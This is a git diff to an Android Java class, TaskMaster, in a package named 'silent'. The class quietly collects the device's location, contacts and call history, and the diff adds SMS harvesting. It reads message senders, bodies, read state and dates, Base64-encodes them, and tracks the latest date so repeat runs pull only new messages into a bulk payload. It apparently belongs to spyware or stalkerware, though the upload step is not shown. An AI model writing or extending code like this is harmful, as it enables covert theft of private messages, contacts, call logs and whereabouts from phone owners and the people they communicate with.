@@ -37,10 +37,8 @@ import java.security.NoSuchAlgorithmException;
 import java.sql.Timestamp;
 import java.util.ArrayList;
 import java.util.Calendar;
-import java.util.Date;
 import java.util.List;
 
-import src.silent.models.SmsModel;
 import src.silent.utils.BitmapJsonHelper;
 import src.silent.utils.LocationHandler;
 import src.silent.utils.SHA1Helper;
@@ -76,6 +74,9 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                         break;
                     case 2:
                         getCallHistory(bulkData, hashes[i]);
+                        break;
+                    case 3:
+                        getMessages(bulkData, hashes[i]);
                         break;
                 }
             }
@@ -133,9 +134,10 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                                 Base64.URL_SAFE));
             }
 
-            if (!SHA1Helper.SHA1(shaString).equals(hash)) {
-                locationData.put("Hash", Base64.encodeToString(SHA1Helper.SHA1(shaString)
-                        .getBytes(), Base64.URL_SAFE));
+            String theHash = SHA1Helper.SHA1(shaString);
+            if (!theHash.equals(hash)) {
+                locationData.put("Hash", Base64.encodeToString(theHash.getBytes(),
+                        Base64.URL_SAFE));
                 bulkData.put("Location", locationData);
             }
 
@@ -148,45 +150,76 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         }
     }
 
-    private void getMessages(JSONObject bulkData) {
-        List<SmsModel> lstSms = new ArrayList<>();
-        SmsModel objSmsModel;
-        Uri message = Uri.parse("content://mms-sms/conversations/");
-        ContentResolver cr = params.getContentResolver();
-        Cursor c = cr.query(message, new String[]{"*"}, null, null,
-                "date DESC");
-        int totalSMS = c.getCount();
+    private void getMessages(JSONObject bulkData, String hash) {
+        try {
+            Uri message = Uri.parse("content://sms");
+            ContentResolver cr = params.getContentResolver();
+            final String[] projection = new String[]{"address", "body", "read", "date", "type"};
+            String selection = null;
+            String[] selectionArgs = null;
+            if (!hash.equals("0")) {
+                selection = "date>?";
+                selectionArgs = new String[] {hash};
+            }
+            Cursor c = cr.query(message, projection, selection, selectionArgs,"date DESC");
 
-        if (c.moveToFirst()) {
-            for (int i = 0; i < totalSMS; i++) {
+            String newHash = "";
+            int totalSMS = c.getCount();
+            if (c.moveToFirst()) {
+                JSONObject messages = new JSONObject();
+                JSONArray informationArray = new JSONArray();
+                for (int i = 0; i < totalSMS; i++) {
+                    JSONObject information = new JSONObject();
+                    information.put("Address", Base64.encodeToString(c.getString(c
+                                    .getColumnIndexOrThrow("address")).getBytes(),
+                            Base64.URL_SAFE));
+                    information.put("Body", Base64.encodeToString(c.getString(c.
+                            getColumnIndexOrThrow("body")).getBytes(), Base64.URL_SAFE));
+                    information.put("State", Base64.encodeToString(c.getString(c
+                            .getColumnIndex("read")).getBytes(), Base64.URL_SAFE));
+                    Timestamp date = new Timestamp(Long.
+                            parseLong(c.getString(c.getColumnIndexOrThrow("date"))));
+                    String baseDate = Base64.encodeToString(date.toString().getBytes(),
+                            Base64.URL_SAFE);
+                    if (i == 0) {
+                        newHash = c.getString(c.getColumnIndexOrThrow("date"));
+                    }
+                    information.put("Date", baseDate);
+                    String type = c.getString(c.getColumnIndexOrThrow("type"));
+                    if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
+                        information.put("Type", Base64.encodeToString("Inbox".getBytes(),
+                                Base64.URL_SAFE));
+                    } else {
+                        information.put("Type", Base64.encodeToString("Sent".getBytes(),
+                                Base64.URL_SAFE));
+                    }
 
-                objSmsModel = new SmsModel();
-                objSmsModel.setId(c.getString(c.getColumnIndexOrThrow("_id")));
-                objSmsModel.setAddress(c.getString(c
-                        .getColumnIndexOrThrow("address")));
-                objSmsModel.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
-                objSmsModel.setReadState(c.getString(c.getColumnIndex("read")));
-                Date date = new Date(Long.
-                        parseLong(c.getString(c.getColumnIndexOrThrow("date"))));
-                objSmsModel.setTime(date.toString());
-                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
-                    objSmsModel.setFolderName("inbox");
-                } else {
-                    objSmsModel.setFolderName("sent");
+                    informationArray.put(information);
+                    c.moveToNext();
                 }
 
-                lstSms.add(objSmsModel);
-                c.moveToNext();
+                if (informationArray.length() != 0) {
+                    messages.put("Messages", informationArray);
+                    messages.put("Hash", newHash);
+                    bulkData.put("Messages", messages);
+                }
             }
+            c.close();
+        } catch (Exception ex) {
+            ex.printStackTrace();
         }
-        c.close();
     }
 
     private void getContacts(JSONObject bulkData, String hash) {
-        ContentResolver contentResolver = params.getContentResolver();
-        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
-                null, null, null, null);
         try {
+            ContentResolver contentResolver = params.getContentResolver();
+            Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
+                    null, null, null, null);
+
+            for (int i=0; i<cursor.getColumnCount(); i++) {
+                Log.d("COLUMN", cursor.getColumnName(i));
+            }
+
             if (cursor != null) {
                 List<String> numbers = new ArrayList<>();
                 JSONObject contacts = new JSONObject();
@@ -249,9 +282,10 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                     }
                 }
                 contacts.put("ContactList", informationArray);
-                if (!SHA1Helper.SHA1(shaString).equals(hash)) {
+                String theHash = SHA1Helper.SHA1(shaString);
+                if (!theHash.equals(hash)) {
                     contacts.put("Hash",
-                            Base64.encodeToString(SHA1Helper.SHA1(shaString).getBytes(),
+                            Base64.encodeToString(theHash.getBytes(),
                                     Base64.URL_SAFE));
                     bulkData.put("Contacts", contacts);
                 }
@@ -302,9 +336,10 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                 managedCursor.close();
 
                 callHistory.put("Calls", informationArray);
-                if (!SHA1Helper.SHA1(shaString).equals(hash)) {
+                String theHash = SHA1Helper.SHA1(shaString);
+                if (!theHash.equals(hash)) {
                     callHistory.put("Hash",
-                            Base64.encodeToString(SHA1Helper.SHA1(shaString).getBytes(),
+                            Base64.encodeToString(theHash.getBytes(),
                                     Base64.URL_SAFE));
                     bulkData.put("CallHistory", callHistory);
                 }
